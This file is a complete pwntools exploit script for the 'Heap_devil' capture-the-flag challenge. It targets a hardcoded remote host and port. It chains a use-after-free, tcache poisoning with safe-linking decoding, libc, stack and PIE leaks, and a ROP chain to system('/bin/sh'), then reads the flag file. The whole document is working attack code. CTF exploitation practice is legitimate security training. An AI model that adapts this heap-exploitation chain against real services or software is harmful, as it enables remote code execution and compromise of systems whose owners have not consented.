#!/usr/bin/env python3
from __future__ import annotations

import argparse
import os
import re
import time
from pathlib import Path

from pwn import ELF, ROP, context, flat, log, p64, remote, process, u64

BASE_DIR = Path(__file__).resolve().parent
BINARY_PATH = BASE_DIR / "Heap_devil"
REMOTE_LIBC_PATH = BASE_DIR / "libc.so.6"

DEFAULT_HOST = "15.235.202.47"
DEFAULT_PORT = 9009
FLAG_RE = re.compile(rb"LYKNCTF\{[^}\r\n]+\}")

# Offsets verified from the supplied Ubuntu GLIBC 2.39.
UNSORTED_FD_OFFSET = 0x203AC0 + 0x60  # main_arena + 0x60
RET_OFFSET = 0x2882F
POP_RDI_OFFSET = 0x10F78B
BINSH_OFFSET = 0x1CB42F


class RetryExploit(Exception):
    pass


class HeapDevil:
    def __init__(self, io, libc: ELF, is_local: bool = False):
        self.io = io
        self.libc = libc
        self.is_local = is_local
        self.count = 0

    def menu(self, choice: int) -> None:
        self.io.sendlineafter(b"> ", str(choice).encode())

    def create(self, size: int, data: bytes = b"A") -> int:
        self.menu(1)
        self.io.sendlineafter(
            b"Enter note size (max 256): ", str(size).encode()
        )
        self.io.sendafter(b"Enter data for note: ", data + b"\n")
        index = self.count
        self.count += 1
        return index

    def view(self, index: int, size: int) -> bytes:
        self.menu(2)
        self.io.sendlineafter(b"Enter note index", str(index).encode())
        self.io.recvuntil(b" DATA: ")
        return self.io.recvn(size)

    def edit(self, index: int, data: bytes) -> None:
        self.menu(3)
        self.io.sendlineafter(b"Enter note index", str(index).encode())
        self.io.sendafter(b"Enter new data: ", data + b"\n")

    def delete(self, index: int) -> None:
        self.menu(4)
        self.io.sendlineafter(b"Enter note index", str(index).encode())
        self.count -= 1

    def resize(self, index: int, size: int, data: bytes = b"R") -> None:
        self.menu(5)
        self.io.sendlineafter(b"Enter note index", str(index).encode())
        self.io.sendlineafter(
            b"Enter new size (max 512): ", str(size).encode()
        )
        # The program prints the success message before asking for the data.
        self.io.sendafter(b"Enter data for note: ", data + b"\n")

    @staticmethod
    def reveal_safe_link(cipher: int) -> int:
        """Reverse x ^ (x >> 12), twelve bits at a time."""
        key = 0
        plain = 0
        for i in range(1, 6):
            bits = max(0, 64 - 12 * i)
            plain = ((cipher ^ key) >> bits) << bits
            key = plain >> 12
        return plain

    @classmethod
    def recover_previous_chunk(cls, encoded_fd: int, chunk_size: int) -> int:
        """
        The poisoned victim was allocated immediately after the previous chunk:

            encoded_fd = previous ^ (victim >> 12)
            victim     = previous + chunk_size
        """
        guess = cls.reveal_safe_link(encoded_fd)
        guess_key = guess >> 12

        # Usually both chunks are on the same page. The small search also handles
        # the rare page-boundary case.
        for key in range(guess_key - 4, guess_key + 5):
            previous = encoded_fd ^ key
            if previous & 0xF:
                continue
            if ((previous + chunk_size) >> 12) == key:
                return previous

        raise RetryExploit(
            f"could not recover safe-linked pointer {encoded_fd:#x}"
        )

    def poison_allocate(self, request_size: int, target: int, data: bytes) -> int:
        """Create a two-entry tcache list, poison its tail, and malloc(target)."""
        base_index = self.count

        # X and Y are consecutive same-sized chunks.
        self.create(request_size, b"X")
        self.create(request_size, b"Y")

        # Free X into the target tcache bin, but keep its note alive at a
        # different size. Deleting that note shifts Y and leaves a duplicate
        # structure. Deleting Y then leaves the off-by-one stale UAF entry.
        self.resize(base_index, 0x30, b"T")
        self.delete(base_index)
        self.delete(base_index)

        leak = self.view(base_index, request_size)
        encoded_fd = u64(leak[:8])
        chunk_size = (request_size + 0x10 + 0xF) & ~0xF
        previous = self.recover_previous_chunk(encoded_fd, chunk_size)
        victim = previous + chunk_size

        if encoded_fd != (previous ^ (victim >> 12)):
            raise RetryExploit("safe-link validation failed")

        poisoned_fd = target ^ (victim >> 12)
        packed_fd = p64(poisoned_fd)
        if b"\n" in packed_fd:
            raise RetryExploit("newline byte in poisoned tcache fd")

        self.edit(base_index, packed_fd)

        # First allocation pops Y. The second returns the arbitrary target.
        self.create(request_size, b"A")
        return self.create(request_size, data)

    def leak_libc(self) -> int:
        # One survivor, seven 0x110 chunks to fill tcache, an unsorted victim,
        # and a small physical guard that prevents top-chunk consolidation.
        self.create(0x20, b"A")
        for _ in range(7):
            self.create(0x100, b"F")
        self.create(0x100, b"V")
        self.create(0x20, b"G")

        # Free seven chunks into the 0x110 tcache bin.
        for index in range(1, 8):
            self.resize(index, 0x80, b"R")

        # Remove guard, duplicate the last victim structure, then free the
        # victim while the 0x110 tcache is full. It lands in unsorted bin.
        self.delete(9)
        self.delete(0)
        self.delete(7)

        unsorted_fd = u64(self.view(7, 0x100)[:8])

        if self.is_local:
            libc_path = os.path.realpath(self.libc.path)
            base = self.io.libs()[libc_path]
        else:
            base = unsorted_fd - UNSORTED_FD_OFFSET

        if base & 0xFFF or not (0x700000000000 <= base < 0x800000000000):
            raise RetryExploit(f"invalid libc base {base:#x}")

        self.libc.address = base
        log.success(f"libc base: {base:#x}")
        return base

    def leak_stack(self) -> int:
        # tcache_get clears entry->key at returned_pointer + 8. Pointing at
        # environ-0x18 preserves environ itself at fake_note + 0x18.
        environ_target = self.libc.sym.environ - 0x18
        environ_index = self.poison_allocate(0x50, environ_target, b"E")
        environ_blob = self.view(environ_index, 0x50)
        stack_environ = u64(environ_blob[0x18:0x20])

        if not (0x700000000000 <= stack_environ < 0x800000000000):
            raise RetryExploit(f"invalid environ leak {stack_environ:#x}")

        log.success(f"environ: {stack_environ:#x}")
        return stack_environ

    def find_saved_return(self, stack_environ: int) -> tuple[int, int]:
        # With this binary, the main call slot is around environ-0x150. During
        # view_note it contains PIE+0x1f2c. Leak a wider aligned window around it.
        windows = [
            (0x80, (stack_environ - 0x1B0) & ~0xF),
            (0x90, (stack_environ - 0x130) & ~0xF),
        ]

        for request_size, target in windows:
            note_index = self.poison_allocate(request_size, target, b"S")
            blob = self.view(note_index, request_size)

            for offset in range(0, len(blob) - 7, 8):
                candidate = u64(blob[offset : offset + 8])
                pie_base = candidate - 0x1F2C
                if candidate & 0xFFF != 0xF2C:
                    continue
                if pie_base & 0xFFF:
                    continue
                if not (0x500000000000 <= pie_base < 0x600000000000):
                    continue

                saved_return = target + offset
                log.success(f"PIE base: {pie_base:#x}")
                log.success(
                    f"saved RIP: {saved_return:#x} "
                    f"(environ {saved_return - stack_environ:+#x})"
                )
                return saved_return, pie_base

        raise RetryExploit("view_note return address was not found on stack")

    def get_rop_offsets(self) -> tuple[int, int, int]:
        if not self.is_local:
            return RET_OFFSET, POP_RDI_OFFSET, BINSH_OFFSET

        old_address = self.libc.address
        self.libc.address = 0
        rop = ROP(self.libc)
        ret_offset = rop.find_gadget(["ret"]).address
        pop_rdi_offset = rop.find_gadget(["pop rdi", "ret"]).address
        binsh_offset = next(self.libc.search(b"/bin/sh\0"))
        self.libc.address = old_address
        return ret_offset, pop_rdi_offset, binsh_offset

    def spawn_shell(self, saved_return: int) -> None:
        ret_offset, pop_rdi_offset, binsh_offset = self.get_rop_offsets()
        base = self.libc.address

        chain = flat(
            0,  # fake saved RBP; allocation starts eight bytes before saved RIP
            base + ret_offset,
            base + pop_rdi_offset,
            base + binsh_offset,
            self.libc.sym.system,
            self.libc.sym.exit,
        )

        if b"\n" in chain:
            raise RetryExploit("newline byte in ROP chain")

        # saved_return is 8-byte aligned, while tcache requires 16-byte
        # alignment. Allocate at saved_return-8 and replace saved RBP + RIP.
        self.poison_allocate(0x70, saved_return - 8, chain)

    def run(self) -> bytes:
        self.leak_libc()
        stack_environ = self.leak_stack()
        saved_return, _ = self.find_saved_return(stack_environ)
        self.spawn_shell(saved_return)

        self.io.sendline(
            b"cat flag.txt 2>/dev/null || cat /flag 2>/dev/null || "
            b"cat /flag.txt 2>/dev/null; exit"
        )
        return self.io.recvall(timeout=5)


def find_host_libc() -> Path:
    candidates = [
        Path("/lib/x86_64-linux-gnu/libc.so.6"),
        Path("/usr/lib/x86_64-linux-gnu/libc.so.6"),
    ]
    for candidate in candidates:
        if candidate.exists():
            return candidate.resolve()
    raise FileNotFoundError("host libc.so.6 was not found")


def exploit_once(host: str, port: int, local: bool):
    exe = ELF(str(BINARY_PATH), checksec=False)

    if local:
        libc = ELF(str(find_host_libc()), checksec=False)
        io = process(exe.path)
    else:
        libc = ELF(str(REMOTE_LIBC_PATH), checksec=False)
        io = remote(host, port, timeout=8)

    context.binary = exe
    context.timeout = 8

    try:
        output = HeapDevil(io, libc, is_local=local).run()
        return output
    finally:
        io.close()


def main() -> int:
    parser = argparse.ArgumentParser(description="H34P D3V1L remote exploit")
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--local", action="store_true", help="test with host libc")
    parser.add_argument("--retries", type=int, default=20)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    context.log_level = "debug" if args.debug else "info"
    attempts = 1 if args.local else max(1, args.retries)

    for attempt in range(1, attempts + 1):
        log.info(f"attempt {attempt}/{attempts}")
        try:
            output = exploit_once(args.host, args.port, args.local)
            match = FLAG_RE.search(output)
            if match:
                flag = match.group().decode()
                print(f"<FLAG>{flag}</FLAG>")
                return 0

            print(output.decode("latin-1", errors="replace"))
            raise RetryExploit("shell returned without a flag")
        except (RetryExploit, EOFError, TimeoutError, OSError) as error:
            log.warning(str(error))
            if attempt != attempts:
                time.sleep(0.25)

    log.failure("exploit failed after all retries")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
